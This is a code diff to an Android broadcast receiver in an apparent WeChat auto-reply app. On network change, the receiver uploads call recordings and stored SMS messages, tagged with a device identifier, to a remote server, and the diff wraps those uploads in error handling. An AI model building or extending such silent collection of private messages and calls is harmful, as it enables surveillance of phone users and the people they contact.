@@ -23,6 +23,7 @@ import com.mikuwxc.autoreply.common.MyApp;
 import com.mikuwxc.autoreply.common.net.NetApi;
 import com.mikuwxc.autoreply.common.util.AppConfig;
 import com.mikuwxc.autoreply.common.util.SPHelper;
+import com.mikuwxc.autoreply.utils.GetImeiUtil;
 import com.mikuwxc.autoreply.utils.SystemUtil;
 import com.mikuwxc.autoreply.wxmoment.Config;
 import com.mikuwxc.autoreply.wxmoment.MomentPicUpload;
@@ -65,9 +66,13 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
              * 有网络  需要处理的事情
              * **/
             //检查是否有电话录音可上传
-            uploadPhoneRecord();
             //检查是否有短信可上传
-            uploadLocalSms();
+            try {
+                uploadPhoneRecord();
+                uploadLocalSms();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
             //检查是否有朋友圈数据可上传
 //            uploadMoment();
 
@@ -89,7 +94,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
     }
 
 
-    private void uploadLocalSms() {
+    private void uploadLocalSms() throws Exception {
         SPHelper.init(MyApp.getAppContext());
         String sms_list_data = SPHelper.getInstance().getString("SMS_LIST_DATA");
         SharePerSmsBean perSmsBean = new Gson().fromJson(sms_list_data, SharePerSmsBean.class);
@@ -103,7 +108,8 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 
                 List<SmssBean> d=new ArrayList<>();
                 for (SharePerSmsBean.DataBean datum : data) {
-                    d.add(new SmssBean(datum.getContent(),SystemUtil.getIMEI(MyApp.getAppContext()),"2".equals(datum.getType())?"true":"false",datum.getTime(),datum.getPhone()));
+                    String onlyIdentification = GetImeiUtil.getOnlyIdentification(MyApp.getAppContext());
+                    d.add(new SmssBean(datum.getContent(), onlyIdentification,"2".equals(datum.getType())?"true":"false",datum.getTime(),datum.getPhone()));
                 }
                 String json=new Gson().toJson(d);
                 String url = AppConfig.OUT_NETWORK + NetApi.upload_sms_messages;
@@ -134,7 +140,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 
     }
 
-    private void uploadPhoneRecord() {
+    private void uploadPhoneRecord() throws Exception {
         File file = new File(Environment.getExternalStorageDirectory() + "/CallRecorderTest");
         File[] files = file.listFiles();
         if (files != null && files.length > 0) {
@@ -162,7 +168,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
                     type = "undifined";
                 }
 
-                String imei = SystemUtil.getIMEI(MyApp.getAppContext());
+                String imei =GetImeiUtil.getOnlyIdentification(MyApp.getAppContext());
 //                RecordUpload.uploadAmr(name, f.getAbsolutePath(), startTime, endTime, imei, type, phoneNum);
                 RecordUpload.handleArm2mp3(name, f.getAbsolutePath(), startTime, endTime, imei, type, phoneNum);
             }
